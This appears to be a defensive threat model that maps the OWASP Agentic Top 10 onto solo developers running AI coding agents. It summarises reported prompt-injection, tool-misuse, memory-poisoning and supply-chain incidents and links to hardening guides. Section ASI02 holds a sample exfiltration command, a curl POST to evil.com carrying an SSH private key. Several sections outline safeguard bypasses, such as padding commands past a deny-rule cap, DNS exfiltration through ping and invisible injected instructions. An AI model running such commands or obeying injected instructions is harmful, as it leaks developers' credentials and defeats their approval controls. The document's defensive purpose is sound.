# Threat Model: OWASP Agentic Top 10 for Solo Developers

## Why This Exists

You run an AI coding agent with access to your terminal, your files, and your credentials. That agent talks to a cloud API. Everything it reads — every file, every command output, every environment variable — becomes part of a conversation that leaves your machine.

There is no OWASP Testing Guide equivalent for autonomous coding agents. Enterprise security frameworks assume teams, SOCs, and network perimeters. Solo developers have none of that. You are the developer, the ops team, and the security department.

This threat model maps the [OWASP Top 10 for Agentic Applications (2026)](https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/) to solo developer setups — real tools, real attack vectors, real incidents. It draws on the [precize/Agentic-AI-Top10-Vulnerability](https://github.com/precize/Agentic-AI-Top10-Vulnerability) taxonomy that underpins the OWASP and CSA red-teaming work.

## The Fundamental Problem

**Any secret an agent can read is a secret that prompt injection can exfiltrate.**

Here is why:

1. Your agent runs `cat .env` or `printenv` — the output contains `STRIPE_SECRET_KEY=sk_live_...`
2. That output becomes part of the conversation context
3. The conversation context is sent to the API provider (Anthropic, OpenAI, Google)
4. A prompt injection — from a malicious README, a crafted package description, a poisoned MCP tool — can instruct the agent to include that context in an outbound request

This is the **composability problem**: every tool invocation's output feeds back into the LLM's context window. The agent cannot distinguish between trusted instructions and untrusted data once they share the same context. This is not a bug — it is how LLM-based agents fundamentally work.

The attack surface is not the API provider's servers. It is your local machine, where the agent runs with your privileges, reads your files, and executes your commands.

**The numbers confirm this.** A January 2026 systematization-of-knowledge paper ([Maloyan & Namiot, arXiv:2601.17548](https://arxiv.org/abs/2601.17548)) identified 42 distinct attack techniques against agentic coding assistants and found that attack success rates against state-of-the-art defenses exceed 85% when adaptive strategies are employed. Most of the 18 defense mechanisms examined achieved less than 50% mitigation against sophisticated adaptive attacks.

## OWASP Agentic Top 10 — Solo Developer Mapping

The OWASP Top 10 for Agentic Applications uses identifiers ASI01 through ASI10. Below, each is mapped to the solo developer context with concrete examples from tools like Claude Code, Cursor, and Windsurf.

---

### ASI01: Agent Goal Hijacking (Prompt Injection)

**OWASP definition:** Attackers manipulate agent goals through direct or indirect instruction injection, causing agents to pursue unintended objectives.

**Solo dev reality:** You clone a repo. The README contains invisible Unicode characters or markdown that instructs your agent to exfiltrate your SSH keys. You never see the injection — the agent does.

**Attack surface:**
- Malicious content in cloned repos (README.md, CONTRIBUTING.md, CLAUDE.md)
- Crafted package descriptions on npm, PyPI, crates.io
- Poisoned comments in code review / pull requests
- Hidden instructions in PDF or image files the agent processes
- Indirect injection via web content fetched by agent tools
- Invisible Unicode Tag characters that LLMs interpret as instructions ([Embrace The Red — Windsurf invisible instructions, 2025](https://embracethered.com/blog/posts/2025/windsurf-sneaking-invisible-instructions-for-prompt-injection/))
- Zero-width characters and steganographic text in HTML content ([Unit 42 — Web-Based IDPI in the Wild, March 2026](https://unit42.paloaltonetworks.com/ai-agent-prompt-injection/))
- Image-based prompt injection via screenshots and diagrams with near-invisible text ([Brave — Unseeable prompt injections, October 2025](https://brave.com/blog/unseeable-prompt-injections/))

**Key research — Unit 42 IDPI in the Wild (March 2026):**
Palo Alto Networks' Unit 42 analyzed detection telemetry and found indirect prompt injection actively weaponized across the web. They identified 22 distinct payload engineering techniques including zero-sized fonts, off-screen positioning, CSS suppression, SVG encapsulation, and Base64-encoded runtime assembly. In 75.8% of cases a single injection was embedded per page. Real attacks included hijacking AI agents into initiating Stripe payments, deleting databases, and approving scam ads.

**Key research — Image-Based Prompt Injection (March 2026):**
Research published in [arXiv:2603.03637](https://arxiv.org/abs/2603.03637) demonstrated that typographic injection achieved a 64% attack success rate in black-box settings against GPT-4V, Claude 3, Gemini, and LLaVA under stealth constraints. The CrossInject framework (ACM MM 2025) showed at least +30.1% improvement in attack success rate over prior methods. Physical-world attacks via adversarial text on signs and screens were demonstrated against autonomous driving assistants in January 2026.

**Comment and Control (April 2026):**
Researcher Aonan Guan (Johns Hopkins) demonstrated "[Comment and Control](https://oddguan.com/blog/comment-and-control-prompt-injection-credential-theft-claude-code-gemini-cli-github-copilot/)" — a class of prompt injection attacks where GitHub PR titles, issue bodies, and comments hijack AI agents running in GitHub Actions. Unlike classic indirect injection, this is proactive: `pull_request` and `issues` events auto-trigger agents without victim interaction. Claude Code Security Review, Gemini CLI Action, and GitHub Copilot Agent were all confirmed vulnerable. Anthropic classified it as CVSS 9.4 Critical.

Source: [VentureBeat — Three AI agents leaked secrets (April 2026)](https://venturebeat.com/security/ai-agent-runtime-security-system-card-audit-comment-and-control-2026) | [SecurityWeek coverage](https://www.securityweek.com/claude-code-gemini-cli-github-copilot-agents-vulnerable-to-prompt-injection-via-comments/)

**Why it matters for solo devs:** You do not have a second pair of eyes reviewing what the agent reads. Enterprise setups can enforce content scanning before agent ingestion. You approve tool calls one at a time in a terminal, often rubber-stamping after the first few.

**Mitigation:** [Hardening Guide — Claude Code](hardening/claude-code.md) | [Hardening Guide — Cursor](hardening/cursor.md)

---

### ASI02: Tool Misuse and Exploitation

**OWASP definition:** Agents use connected tools in unsafe ways, or attackers exploit tool interfaces to gain access or cause harm.

**Solo dev reality:** Your agent has `Bash` tool access. A prompt injection tells it to run `curl -X POST https://evil.com/collect -d "$(cat ~/.ssh/id_ed25519)"`. If you auto-approve bash commands, it executes silently.

**Attack surface:**
- Unrestricted shell access (Claude Code's Bash tool, Cursor's terminal)
- File write access to arbitrary paths (overwriting `.bashrc`, `.zshrc`, git hooks)
- Network access for data exfiltration via curl, wget, or DNS
- Package manager commands (`npm install malicious-package`)
- DNS-based exfiltration via "safe" commands like `ping` (see Cline vulnerability below)
- Shell built-in commands that bypass allowlists (see CVE-2026-22708 below)

**Cline DNS exfiltration (August 2025):**
Mindgard researchers discovered that Cline's allowlist treated `ping` as a safe command requiring no user approval. Attackers embedded instructions in Python docstrings that coerced Cline into reading environment variables and encoding API keys into DNS queries sent to attacker-controlled domains. The attack required no user approval at any step. Disclosed August 2025, partially mitigated in Cline v3.35.0.

Source: [Mindgard — Cline Data Exfiltration via Prompt Injection and DNS](https://mindgard.ai/disclosures/cline-bot-ai-coding-agent-data-exfiltration-via-prompt-injection-and-dns) | [Embrace The Red — Cline Data Exfiltration](https://embracethered.com/blog/posts/2025/cline-vulnerable-to-data-exfiltration/)

**Cursor shell built-in bypass — CVE-2026-22708 (April 2026):**
Pillar Security found that Cursor's Auto-Run Mode with Allowlist validated external commands but not shell built-ins (`export`, `unset`, `set`, `typeset`). An attacker could use `export` to set a malicious `PAGER` environment variable, causing `git log` or `man` to execute arbitrary code. Fixed in Cursor 2.3.

Source: [Pillar Security — The Agent Security Paradox](https://www.pillar.security/blog/the-agent-security-paradox-when-trusted-commands-in-cursor-become-attack-vectors)

**Why it matters for solo devs:** `--dangerously-skip-permissions` and Cursor's YOLO mode exist because the approval flow is tedious for solo work. The moment you skip approvals, every tool call is auto-approved — including the malicious ones.

**Mitigation:** [Hardening Guide — Claude Code](hardening/claude-code.md) | [Hardening Guide — Windsurf](hardening/windsurf.md)

---

### ASI03: Identity and Privilege Abuse

**OWASP definition:** Agents misuse credentials, tokens, or inherited permissions to access systems beyond intended limits.

**Solo dev reality:** Your agent runs as your user. It inherits every credential, every SSH key, every API token in your environment. It can push to any repo you can push to, access any database you can connect to, and deploy to any service you have keys for.

**Attack surface:**
- Full `~/.ssh/` access — agent can read private keys
- `~/.aws/credentials`, `~/.config/gcloud/`, `~/.kube/config` — cloud credentials
- Browser cookies and session tokens in profile directories
- Git credential helpers that auto-authenticate
- `sudo` access if the user has passwordless sudo configured
- OAuth tokens from MCP servers that persist across sessions
- API tokens in environment variables inherited by all child processes

**Claude Code API key exfiltration — CVE-2026-21852 (January 2026):**
Check Point Research found that a malicious repository could set `ANTHROPIC_BASE_URL` in its `.claude/settings.json` to an attacker-controlled endpoint. When a developer opened the project, Claude Code would send API requests — including the developer's Anthropic API key — to the attacker's server before showing the trust prompt. Fixed in Claude Code v2.0.65.

Source: [Check Point Research — RCE and API Token Exfiltration (February 2026)](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/)

**GitHub Copilot CamoLeak — CVE-2025-59145 (August 2025):**
Attackers hid instructions in PR descriptions that caused Copilot Chat to read private source code, API keys, and secrets, then exfiltrate them through GitHub's own Camo image proxy using pre-computed signed URLs for transparent 1x1 pixels. Because traffic routed through GitHub's trusted infrastructure, it bypassed standard network egress controls. CVSS 9.6. Patched August 14, 2025 by disabling image rendering in Copilot Chat.

Source: [BlackFog — CamoLeak](https://www.blackfog.com/camoleak-how-github-copilot-became-an-exfiltration-channel/) | [Dark Reading — CamoLeak AI Attack](https://www.darkreading.com/application-security/github-copilot-camoleak-ai-attack-exfils-data)

**Why it matters for solo devs:** Enterprise setups use service accounts with minimal permissions. Solo devs typically run agents as their own user with full access to everything. There is no role separation.

**Mitigation:** [Credential Management](credential-management.md)

---

### ASI04: Supply Chain Compromise

**OWASP definition:** Compromised third-party agents, tools, plugins, registries, or update channels.

**Solo dev reality:** You install an MCP server from GitHub. It passes your initial review. A week later, the maintainer pushes a silent update that exfiltrates your conversation history. This is the **rug pull** — the tool changes after you trusted it.

**Attack surface:**
- Malicious MCP servers with poisoned tool descriptions
- npm/PyPI packages with embedded prompt injections in READMEs
- Compromised VS Code / Cursor extensions
- Agent skill registries (ClawHub, skills.sh) — Snyk found [13.4% of skills contain critical security issues](https://snyk.io/blog/toxicskills-malicious-ai-agent-skills-clawhub/)
- Auto-updating tools that change behavior silently
- Social engineering lures impersonating popular AI tools (see Trend Micro below)
- CI/CD pipeline poisoning via compromised AI agent bots (see Clinejection below)

**Key research — Snyk ToxicSkills (February 2026):**
Snyk audited 3,984 agent skills from ClawHub and skills.sh. Results: 534 skills (13.4%) contained critical issues including malware distribution and prompt injection. 1,467 skills (36.8%) had at least one security flaw. 76 malicious payloads were found in markdown instructions to AI agents, with 91% combining prompt injection with traditional malware.

**Key research — Credential Leakage in LLM Agent Skills (April 2026):**
A large-scale empirical study ([arXiv:2604.03070](https://arxiv.org/abs/2604.03070)) analyzed 17,022 skills (sampled from 170,226 on SkillsMP). Found 520 vulnerable skills with 1,708 issues across 10 leakage patterns (4 accidental, 6 adversarial). Stdout leakage was the dominant channel, affecting 75.8% of vulnerable skills — credentials surface through log output captured and injected into the LLM context.

**Clinejection supply chain attack (February 2026):**
Security researcher Adnan Khan [disclosed](https://adnanthekhan.com/posts/clinejection/) that a single GitHub issue could trigger a chain: prompt injection in the issue title tricks Claude (Cline's triage bot) into running `npm install` from an attacker-controlled commit, the malicious `preinstall` script deploys a cache poisoner, which eventually exfiltrates npm publishing tokens from the nightly publish workflow. Eight days after disclosure, an unknown actor exploited the same flaw to publish unauthorized `cline@2.3.0` to npm, which silently installed OpenClaw on ~4,000 developer machines during an eight-hour window.

Source: [Snyk — Clinejection Supply Chain Attack](https://snyk.io/blog/cline-supply-chain-attack-prompt-injection-github-actions/) | [The Hacker News — Cline CLI 2.3.0 Supply Chain Attack](https://thehackernews.com/2026/02/cline-cli-230-supply-chain-attack.html)

**Claude Code malware lures (April 2026):**
Trend Micro documented an active campaign impersonating "leaked" Claude Code downloads, distributing Vidar stealer and GhostSocks proxy malware through 38 distinct 7z archives. The campaign pivoted within 24 hours of Anthropic's March 2026 source code leak, weaponizing the incident's visibility.

Source: [Trend Micro — Weaponizing Trust Signals (April 2026)](https://www.trendmicro.com/en_us/research/26/d/weaponizing-trust-claude-code-lures-and-github-release-payloads.html)

**OpenClaw security crisis (January-April 2026):**
OpenClaw, an open-source AI agent with 135,000+ GitHub stars, accumulated 138 CVEs over a 63-day window (~2.2 per day), including CVE-2026-25253 (CVSS 8.8, one-click RCE via WebSocket origin validation gap). SecurityScorecard found 135,000+ instances exposed to the public internet, with 15,000+ directly vulnerable to RCE. 341 malicious skills (12% of the ClawHub registry) were confirmed, using professional documentation and innocuous names to disguise keyloggers and malware.

Source: [Reco AI — OpenClaw Security Crisis](https://www.reco.ai/blog/openclaw-the-ai-agent-security-crisis-unfolding-right-now) | [Sangfor — OpenClaw Security Risks](https://www.sangfor.com/blog/cybersecurity/openclaw-ai-agent-security-risks-2026)

**ClawHavoc supply chain campaign (early 2026):**
Investigators uncovered ClawHavoc, a large-scale supply-chain malware campaign specifically targeting OpenClaw users. Attackers uploaded over 1,100 malicious skills to ClawHub, masquerading as productivity, crypto, and coding tools. The campaign exploited the registry's rapid growth and insufficient vetting infrastructure — the same dynamics that enabled the broader OpenClaw crisis.

**Why it matters for solo devs:** You do not have a security team vetting your tool chain. MCP servers run locally with your permissions. A single malicious MCP server can intercept calls to other MCP servers, read your files, and exfiltrate data — all while appearing to function normally.

**Mitigation:** [Supply Chain Defense Guide](supply-chain-defense.md) | [References — Security Tools](references.md)

---

### ASI05: Unexpected Code Execution

**OWASP definition:** Agent-generated or agent-invoked code creates unintended execution, compromise, or escape.

**Solo dev reality:** The agent writes a test file. The test imports a module that runs an `__init__.py` with a reverse shell. Or the agent generates a Makefile that downloads and executes a remote script. The code looks plausible — you approve it.

**Attack surface:**
- Agent-generated code with embedded backdoors
- Import-time execution in Python (`__init__.py`, `setup.py`)
- Package install scripts (`postinstall` in npm, `setup.py install` in pip)
- Dynamic eval/exec in generated code
- Git hooks written by the agent (pre-commit, post-checkout)
- `.vscode/tasks.json` with `folderOpen` autorun (see Cursor vulnerability below)
- MCP server configurations that execute on project open

**Cursor CVE history (2025-2026):**
- **CVE-2025-4609** — Chromium IPC sandbox escape leaving [1.5M developers vulnerable](https://www.ox.security/blog/the-aftermath-of-cve-2025-4609-critical-sandbox-escape-leaves-1-5m-developers-vulnerable/)
- **CVE-2025-54135 (CurXecute)** — RCE via prompt injection through Cursor's agent
- **CVE-2025-54136 (MCPoison)** — MCP server manipulation enabling [code execution](https://www.tenable.com/blog/faq-cve-2025-54135-cve-2025-54136-vulnerabilities-in-cursor-curxecute-mcpoison)
- **CVE-2025-59944** — Case-sensitivity bug [exposing agentic tool risks](https://www.lakera.ai/blog/cursor-vulnerability-cve-2025-59944)
- **CVE-2025-64106** — MCP installation trust bypass enabling [arbitrary command execution](https://cyata.ai/blog/cyata-research-critical-flaw-in-cursor-mcp-installation/) (CVSS 8.8)
- **CVE-2026-22708** — Shell built-in allowlist bypass enabling [environment poisoning and RCE](https://www.pillar.security/blog/the-agent-security-paradox-when-trusted-commands-in-cursor-become-attack-vectors)
- **CVE-2026-26268** — Git hooks sandbox escape enabling [out-of-sandbox RCE](https://www.sentinelone.com/vulnerability-database/cve-2026-26268/)
- **CVE-2026-31854** — Command injection via malicious website: indirect prompt injection combined with a command whitelist bypass caused commands to execute automatically without user intent. Fixed in Cursor 2.0.

**OX Security: 94 n-day Chromium vulnerabilities in Cursor and Windsurf (October 2025):**
Both IDEs are built on outdated VS Code/Electron forks and have not updated their bundled Chromium engine since version 132.0.6834.210 (March 21, 2025). OX Security identified 94+ known CVEs in that Chromium build and successfully weaponized CVE-2025-7656 against the latest releases of both IDEs — 1.8 million developers affected. Cursor classified the report "out of scope"; Windsurf did not respond to responsible disclosure.

Source: [Bleeping Computer — Cursor, Windsurf IDEs riddled with 94+ n-day Chromium vulnerabilities](https://www.bleepingcomputer.com/news/security/cursor-windsurf-ides-riddled-with-94-plus-n-day-chromium-vulnerabilities/) | [OX Security — Forked and Forgotten](https://www.ox.security/blog/94-vulnerabilities-in-cursor-and-windsurf-put-1-8m-developers-at-risk/)

**Cursor open-folder autorun (September 2025):**
Oasis Security found that Cursor ships with VS Code's Workspace Trust disabled by default. A repository containing `.vscode/tasks.json` with `runOptions.runOn: "folderOpen"` executes code the moment a developer opens the folder — no trust prompt, no consent.

Source: [Oasis Security — Cursor Open-Folder Autorun](https://www.oasis.security/blog/cursor-security-flaw)

**Claude Code hooks injection — CVE-2025-59536 (October 2025):**
Check Point Research demonstrated that a malicious `.claude/settings.json` in a repository could inject shell commands into Claude Code's Hooks system, achieving automatic code execution upon project initialization with no warning. Fixed in Claude Code v1.0.111.

Source: [Check Point Research — Caught in the Hook](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/)

**IDEsaster — 30+ CVEs across all AI IDEs (December 2025):**
Security researcher Ari Marzouk (MaccariTA) disclosed [IDEsaster](https://maccarita.com/posts/idesaster/) — a vulnerability class affecting every AI IDE tested, including Cursor, Windsurf, GitHub Copilot, Zed.dev, Roo Code, Junie, Cline, and Claude Code. 24 CVEs were assigned. The key insight: all AI IDEs treat the base IDE's features as inherently safe, but prompt injection can activate those features (JSON schemas, workspace configs, terminal commands) as attack vectors.

Source: [The Hacker News — 30+ Flaws in AI Coding Tools](https://thehackernews.com/2025/12/researchers-uncover-30-flaws-in-ai.html) | [MaccariTA — IDEsaster](https://maccarita.com/posts/idesaster/)

**Gemini CLI silent execution (June 2025):**
Two days after Gemini CLI's release, Tracebit [discovered](https://tracebit.com/blog/code-exec-deception-gemini-ai-cli-hijack) that the allow-list mechanism was improperly implemented, enabling attackers to bypass command restrictions and achieve silent code execution. Thousands of developers were potentially exposed before Google patched in v0.1.14 on July 25, 2025.

Source: [CyberScoop — Gemini CLI prompt injection](https://cyberscoop.com/google-gemini-cli-prompt-injection-arbitrary-code-execution/)

**Why it matters for solo devs:** Sandbox escapes mean even agents running in restricted modes can break out. Cursor's CVE history shows this is not theoretical — it happened repeatedly across 2025-2026. 100% of tested AI IDEs were vulnerable to IDEsaster.

**Mitigation:** [Hardening Guide — Cursor](hardening/cursor.md) | [Hardening Guide — Windsurf](hardening/windsurf.md)

---

### ASI06: Memory and Context Poisoning

**OWASP definition:** Retrieved or stored context is poisoned, misleading, or tampered with, influencing future agent behavior.

**Solo dev reality:** A malicious repo includes a `CLAUDE.md` file that silently overrides your security rules. Or your agent's persistent memory is poisoned by a previous session where it processed attacker-controlled content. The poison persists across sessions.

**Attack surface:**
- Malicious `CLAUDE.md` / `.cursorrules` / `.windsurfrules` in cloned repos
- Poisoned conversation history or memory files
- Injected context via MCP memory servers
- Crafted file content that alters agent behavior when read
- `.clinerules` directory overriding approval flags for all commands
- Long-term memory persistence enabling SpAIware attacks (see below)

**Claude Code source leak (March 2026):**
Anthropic accidentally shipped source maps in npm package `@anthropic-ai/claude-code@2.1.88`, exposing [512,000 lines of TypeScript](https://venturebeat.com/technology/claude-codes-source-code-appears-to-have-leaked-heres-what-we-know/) including the permission system, tool orchestration, memory architecture, and 44 unreleased feature flags. Attackers can now craft repository-specific poisoning attacks tailored to Claude Code's exact parsing logic.

**Claude Code deny rules bypass (April 2026):**
Adversa AI [discovered](https://adversa.ai/blog/claude-code-security-bypass-deny-rules-disabled/) that Claude Code's `bashPermissions.ts` caps per-subcommand security analysis at 50 entries. Any shell command containing more than 50 subcommands causes Claude Code to skip all deny-rule enforcement. An attacker's `CLAUDE.md` could define a "build process" with 50 no-op `true` commands followed by a credential-exfiltration payload at position 51 — the deny rule never fires. Patched April 6, 2026.

Source: [The Register — Claude Code bypasses safety rule](https://www.theregister.com/2026/04/01/claude_code_rule_cap_raises/) | [SecurityWeek — Critical Vulnerability After Source Leak](https://www.securityweek.com/critical-vulnerability-in-claude-code-emerges-days-after-source-leak/)

**Windsurf SpAIware — persistent memory poisoning (2025):**
Embrace The Red [demonstrated](https://embracethered.com/blog/posts/2025/windsurf-spaiware-exploit-persistent-prompt-injection/) that Windsurf is vulnerable to long-term memory persistence attacks where an adversary persists malicious instructions that survive across sessions. A single interaction with a poisoned repo can alter the agent's behavior for all future sessions.

**Why it matters for solo devs:** You clone repos constantly. Each repo can include agent configuration files that alter behavior. There is no review process for these files before the agent reads them. Once memory is poisoned, the damage persists across sessions.

**Mitigation:** [Hardening Guide — Claude Code](hardening/claude-code.md)

---

### ASI07: Insecure Inter-Agent Communication

**OWASP definition:** Spoofing, intercepting, or manipulating agent-to-agent messages.

**Solo dev reality:** You run multiple MCP servers. Server A is trusted (your database). Server B is a community tool you installed last week. Server B's tool description contains hidden instructions that override Server A's behavior, causing the agent to route your database queries through Server B.

**Attack surface:**
- Cross-MCP-server tool description poisoning
- Shared context between multiple agents or MCP servers
- No authentication between MCP client and servers (local stdio transport)
- Tool name shadowing — a malicious MCP server registers a tool with the same name as a trusted one
- MCP SDK architectural RCE vulnerability affecting all implementations (see below)

**Key research — Invariant Labs (2025):**
Demonstrated a [rug-pull attack](https://invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks) where a malicious MCP server initially advertised a harmless tool, then silently changed its description on the second launch to include instructions for data exfiltration. The tool passed initial review but became malicious after trust was established.

**MCP SDK systemic vulnerability — "Mother of All AI Supply Chains" (April 2026):**
OX Security [disclosed](https://www.ox.security/blog/the-mother-of-all-ai-supply-chains-critical-systemic-vulnerability-at-the-core-of-the-mcp/) an architectural RCE vulnerability baked into Anthropic's official MCP SDKs across Python, TypeScript, Java, and Rust. Impact: 150M+ downloads, 7,000+ publicly exposed servers, up to 200,000 vulnerable instances. Four exploitation families were confirmed: unauthenticated UI injection, hardening bypasses in protected environments, zero-click prompt injection in IDEs, and malicious marketplace distribution (9 of 11 registries poisoned). Ten CVEs were issued including CVE-2026-30623, CVE-2026-30615, CVE-2026-30624. Anthropic confirmed the behavior is by design and declined to modify the protocol.

Source: [The Register — MCP design flaw puts 200k servers at risk](https://www.theregister.com/2026/04/16/anthropic_mcp_design_flaw/) | [Infosecurity Magazine — Systemic Flaw in MCP](https://www.infosecurity-magazine.com/news/systemic-flaw-mcp-expose-150/)

**Anthropic's own Git MCP server — CVE-2025-68143/68144/68145 (January 2026):**
[Three prompt injection vulnerabilities](https://thehackernews.com/2026/01/three-flaws-in-anthropic-mcp-git-server.html) in Anthropic's official Git MCP server: `git_init` created repositories at arbitrary paths without validation (68143), `git_diff`/`git_checkout` passed unsanitized arguments enabling file overwrites (68144), and the `--repository` flag failed to validate paths allowing sandbox escape (68145). Combined with the Filesystem MCP server, these achieved full RCE via malicious `.git/config` files. An attacker only needed to influence what an AI assistant reads — a malicious README, a poisoned issue description, or a compromised webpage.

Source: [SecurityWeek — Anthropic MCP Server Flaws](https://www.securityweek.com/anthropic-mcp-server-flaws-lead-to-code-execution-data-exposure/) | [Dark Reading — Microsoft & Anthropic MCP Servers at Risk](https://www.darkreading.com/application-security/microsoft-anthropic-mcp-servers-risk-takeovers)

**Why it matters for solo devs:** MCP's local stdio transport has no authentication. Any MCP server you run can see tool descriptions from other servers and craft cross-server attacks. Anthropic has acknowledged the architectural risk but declined to change it.

**Mitigation:** [References — Security Tools](references.md)

---

### ASI08: Cascading Agent Failures

**OWASP definition:** A single vulnerability propagates through connected tools, memory, and agents.

**Solo dev reality:** A prompt injection in a README causes your agent to modify `.bashrc`. The modified `.bashrc` adds a malicious alias. Every future terminal session — agent or manual — now executes the attacker's code. The initial injection is long gone, but the damage persists.

**Attack surface:**
- Agent modifies shell configuration files (`.bashrc`, `.zshrc`, `.profile`)
- Agent writes git hooks that trigger on every commit
- Agent modifies CI/CD configuration (`.github/workflows/`)
- Agent changes npm scripts that run on every `npm install`
- Agent modifies Makefile targets
- Agent poisons persistent memory that affects future sessions
- Multi-agent cascading: a single compromised agent can poison 87% of downstream decision-making within 4 hours (Galileo AI, December 2026)

**Moltbook platform breach (January-February 2026):**
The AI agent social network Moltbook hosted 1.5 million autonomous agents managed by ~17,000 humans. Wiz researchers [discovered](https://www.wiz.io/blog/exposed-moltbook-database-reveals-millions-of-api-keys) an exposed Supabase API key in front-end JavaScript code exposing 1.5M API authentication tokens, 35,000 email addresses, and private messages. Security researchers identified 506 prompt injections spreading through the agent network — a real-world demonstration of cascading agent failures.

Source: [Fortune — Moltbook (January 2026)](https://fortune.com/2026/01/31/ai-agent-moltbot-clawdbot-openclaw-data-privacy-security-nightmare-moltbook-social-network/) | [Fortune — Moltbook security researchers (February 2026)](https://fortune.com/2026/02/03/moltbook-ai-social-network-security-researchers-agent-internet/)

**Why it matters for solo devs:** You are the only user on the machine. A single persistence mechanism affects everything you do. There is no network segmentation, no separate build server, no isolated CI environment.

**Mitigation:** [Quick Start Guide](guides/quick-start.md)

---

### ASI09: Human-Agent Trust Exploitation

**OWASP definition:** Attackers manipulate user trust in agent recommendations or outputs.

**Solo dev reality:** After 50 successful tool calls, you start auto-approving. The agent has earned your trust. On call 51, a prompt injection fires. You approve it without reading because you have been approving for the last hour.

**Attack surface:**
- Approval fatigue — auto-approving after repeated benign calls
- `--dangerously-skip-permissions` / YOLO mode as "just get it done" shortcuts
- Trust in agent-generated code without review
- Assuming the agent would not do something harmful
- MCP installation dialogs that disguise malicious tools as trusted ones (CVE-2025-64106)
- Workspace Trust disabled by default in Cursor — repos auto-execute code on open

**AI browser trust exploitation (2025-2026):**
Trail of Bits [demonstrated](https://blog.trailofbits.com/2026/01/13/lack-of-isolation-in-agentic-browsers-resurfaces-old-vulnerabilities/) that agentic browsers reuse cookies for agent-initiated requests, enabling data exfiltration from any site the user is logged into. A malicious DM on Instagram, GitHub, X, or Slack containing prompt injection instructions could leak personal data from other users. These attacks mirror XSS and CSRF — vulnerabilities the web community spent decades defending against — but are resurging because AI agents lack equivalent isolation.

**Unseeable prompt injections (October 2025):**
Brave researchers [showed](https://brave.com/blog/unseeable-prompt-injections/) that Perplexity's Comet browser could be attacked using low-contrast or near-invisible text in images and webpages. The AI extracts text imperceptible to humans and treats it as commands. Simply summarizing a Reddit post while logged into your bank could result in financial theft.

**EchoLeak — CVE-2025-32711 (May 2025):**
The first known zero-click attack on an AI agent. A crafted email sent to a Microsoft 365 Copilot user triggered data exfiltration without any user interaction — no clicks, no prompts. The attack chained XPIA classifier bypass, reference-style Markdown link redaction circumvention, auto-fetched images, and a Microsoft Teams proxy abuse. CVSS 9.3.

Source: [arXiv:2509.10540 — EchoLeak](https://arxiv.org/abs/2509.10540) | [The Hacker News — Zero-Click AI Vulnerability](https://thehackernews.com/2025/06/zero-click-ai-vulnerability-exposes.html)

**Case study — this project (April 2026):**
During development of LLM Safe Haven itself, 10+ PRs from background AI agents were merged without reading the actual code diffs. The first wave of PRs was carefully reviewed. As confidence in agent output grew, subsequent PRs — including security-critical code (checksums, settings.json merge, CI workflows) — were merged based on the agent's self-reported summary alone. Result: 4 CRITICAL vulnerabilities shipped, including command injection via `execSync` with unsanitized string interpolation — in a tool designed to prevent exactly this class of attack. The trust escalation pattern was identical to the approval fatigue described above, but applied to code review rather than tool approval. Fixes: [#27](https://github.com/pleasedodisturb/llm-safe-haven/pull/27), [#28](https://github.com/pleasedodisturb/llm-safe-haven/pull/28), [#29](https://github.com/pleasedodisturb/llm-safe-haven/pull/29).

**Why it matters for solo devs:** Enterprise setups can enforce mandatory review gates. Solo devs are the only reviewer, and the temptation to skip approval is constant. Every agent tool ships a "skip all approvals" flag because the vendors know the approval UX is broken for real work. The same trust escalation applies to reviewing agent-generated code — summaries describe intent, not reality.

**Mitigation:** [Hardening Guide — Claude Code](hardening/claude-code.md)

---

### ASI10: Rogue Agents

**OWASP definition:** Agents that deviate from intended behavior or become fully compromised.

**Solo dev reality:** Your agent's behavior is determined by its system prompt, your instructions, and everything in its context window. If the context is poisoned, the agent is compromised. It will follow malicious instructions with the same capability and confidence it follows yours.

**Attack surface:**
- System prompt extraction and manipulation
- Context window overflow pushing out safety instructions
- Jailbreaks that bypass tool restrictions
- Agents operating autonomously for extended periods without checkpoints
- Deny-rule bypass via command padding (>50 subcommands in Claude Code)
- Zero-click MCP configuration injection (CVE-2026-30615 in Windsurf)

**Windsurf zero-click — CVE-2026-30615 (April 2026):**
The only true zero-click prompt injection in an AI IDE: Windsurf automatically reads MCP configuration from the open project. A malicious MCP configuration file in a cloned repository causes the SDK to invoke the specified command on project open — no click, no confirmation. This is a "rogue agent by default" scenario where opening a folder is enough to compromise the system.

Source: [NVD — CVE-2026-30615](https://nvd.nist.gov/vuln/detail/CVE-2026-30615) | [OX Security — MCP Supply Chain Advisory](https://www.ox.security/blog/the-mother-of-all-ai-supply-chains-critical-systemic-vulnerability-at-the-core-of-the-mcp/)

**Why it matters for solo devs:** You might run an agent overnight on a long task. Without logging and monitoring, you have no way to detect if the agent deviated from its intended behavior at 3 AM.

**Mitigation:** [Quick Start Guide](guides/quick-start.md)

---

## Attack Vector Reference Table

| Vector | Severity | Description | Incident/Evidence |
|--------|----------|-------------|-------------------|
| Direct env var read | High | Agent runs `printenv`, `env`, or `echo $SECRET` — output goes to API | [Knostic: .env to Leakage (Dec 2025)](https://www.knostic.ai/blog/claude-cursor-env-file-secret-leakage) |
| File read of .env | High | Claude Code reads `.env` files by default, without notifying the user | [Knostic: Claude loads secrets without permission](https://www.knostic.ai/blog/claude-loads-secrets-without-permission) |
| Prompt injection via dependencies | Critical | Malicious package README/comments cause agent to exfiltrate secrets | [VentureBeat: Three AI agents leaked secrets (Apr 2026)](https://venturebeat.com/security/ai-agent-runtime-security-system-card-audit-comment-and-control-2026) |
| MCP tool poisoning | Critical | Malicious MCP server overrides tool descriptions, intercepts calls | [Invariant Labs: Tool Poisoning Attacks (2025)](https://invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks) |
| MCP rug pull | Critical | MCP server changes behavior after initial trust is established | [Invariant Labs: Tool Poisoning Attacks (2025)](https://invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks) |
| MCP SDK architectural RCE | Critical | Command execution baked into MCP SDK design across all languages | [OX Security: Mother of All AI Supply Chains (Apr 2026)](https://www.ox.security/blog/the-mother-of-all-ai-supply-chains-critical-systemic-vulnerability-at-the-core-of-the-mcp/) |
| DNS exfiltration via safe commands | High | `ping` commands whitelisted as safe encode secrets in DNS queries | [Mindgard: Cline DNS Exfiltration (Aug 2025)](https://mindgard.ai/disclosures/cline-bot-ai-coding-agent-data-exfiltration-via-prompt-injection-and-dns) |
